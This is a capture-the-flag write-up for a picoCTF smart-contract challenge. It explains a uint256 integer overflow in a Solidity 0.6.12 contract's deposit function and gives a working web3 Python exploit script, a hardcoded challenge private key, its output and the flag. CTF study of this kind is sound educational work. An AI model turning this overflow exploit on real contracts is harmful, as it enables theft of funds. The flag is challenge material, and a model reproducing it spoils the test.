# Integer Overflow CTF Challenge Writeup

## Objective
The goal of this challenge is to obtain the flag by exploiting an integer overflow vulnerability in the provided Ethereum smart contract (`IntOverflowBank.sol`).

## Contract Analysis
The `IntOverflowBank.sol` contract manages an internal mapping of balances:
```solidity
mapping(address => uint256) public balances;
```

The contract has a `deposit` function to increase the balance of the sender:
```solidity
function deposit(uint256 amount) external {
    uint256 oldBalance = balances[msg.sender];
    balances[msg.sender] = balances[msg.sender] + amount;

    emit Deposit(msg.sender, amount);
    if (!revealed && balances[msg.sender] < amount) {
        revealed = true;
        emit FlagRevealed(flag);
    }
}
```

And a `getFlag` function to retrieve the flag:
```solidity
function getFlag() external view returns (string memory) {
    require(revealed, "Flag not revealed yet");
    return flag;
}
```

The key vulnerability lies in the `deposit` function, specifically the calculation:
```solidity
balances[msg.sender] = balances[msg.sender] + amount;
```
The contract uses Solidity `^0.6.12`, which means it doesn't automatically revert on integer overflow (this behavior was introduced in Solidity 0.8.0). `balances[msg.sender]` is a `uint256` (unsigned integer of 256 bits), so its maximum value is `2**256 - 1`. If we add to a balance such that it exceeds this maximum, it will wrap around (overflow) to 0 and continue counting.

To reveal the flag, the following condition must be met:
```solidity
if (!revealed && balances[msg.sender] < amount)
```

We need to make our resulting balance `balances[msg.sender]` smaller than the `amount` we just deposited. This is only possible if an integer overflow occurs during the addition.

## Exploitation Steps

1. **First Deposit (Setup):**
   We deposit the maximum possible `uint256` value: `2**256 - 1` (which is `115792089237316195423570985008687907853269984665640564039457584007913129639935`).
   - `balances[msg.sender]` was `0`.
   - `balances[msg.sender]` becomes `2**256 - 1`.
   - `balances[msg.sender] < amount` is `false` (`2**256 - 1 < 2**256 - 1` is false).

2. **Second Deposit (Overflow):**
   We deposit `1`.
   - `balances[msg.sender]` was `2**256 - 1`.
   - `balances[msg.sender]` becomes `(2**256 - 1) + 1`, which overflows to `0`.
   - Now, the condition `balances[msg.sender] < amount` is checked: `0 < 1`, which evaluates to `true`!
   - This sets `revealed = true`.

3. **Get Flag:**
   With `revealed` set to `true`, we can call the `getFlag()` function.

## Exploit Script

A Python script using `web3` was written to automate these steps:

```python
from web3 import Web3

# Node connection
rpc_url = "http://mysterious-sea.picoctf.net:57251"
w3 = Web3(Web3.HTTPProvider(rpc_url))

# Account details
private_key = "0xb5e2835282868af70e2415d247cb83f4b5cd5423c3a5224f926954cab1c0abc8"
account = w3.eth.account.from_key(private_key)
sender_address = account.address

# Contract details
contract_address = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
contract_abi = [
    {
        "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "deposit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function"
    }
]

contract = w3.eth.contract(address=contract_address, abi=contract_abi)

def send_transaction(func):
    nonce = w3.eth.get_transaction_count(sender_address)
    tx = func.build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 2000000,
        'gasPrice': w3.eth.gas_price,
        'nonce': nonce,
    })
    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Transaction sent: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Transaction receipt status: {receipt.status}")

print("Sending first deposit...")
send_transaction(contract.functions.deposit((2**256) - 1))

print("Sending second deposit...")
send_transaction(contract.functions.deposit(1))

print("Getting flag...")
flag = contract.functions.getFlag().call()
print(f"Flag: {flag}")
```

## Results

Executing the script yields the following output:

```
Sending first deposit...
Transaction sent: 3ff8317396f975f5a9601072ef491319a2534853f3b3bd6152408144001ab9b6
Transaction receipt status: 1
Sending second deposit...
Transaction sent: 824b81a4548fc7f3485874a01b6f21711aaf12e621160178127ca471ea0bf8a8
Transaction receipt status: 1
Getting flag...
Flag: picoCTF{Sm4r7_OverFL0ws_ExI5t_01762532}
```

The flag is: `picoCTF{Sm4r7_OverFL0ws_ExI5t_01762532}`
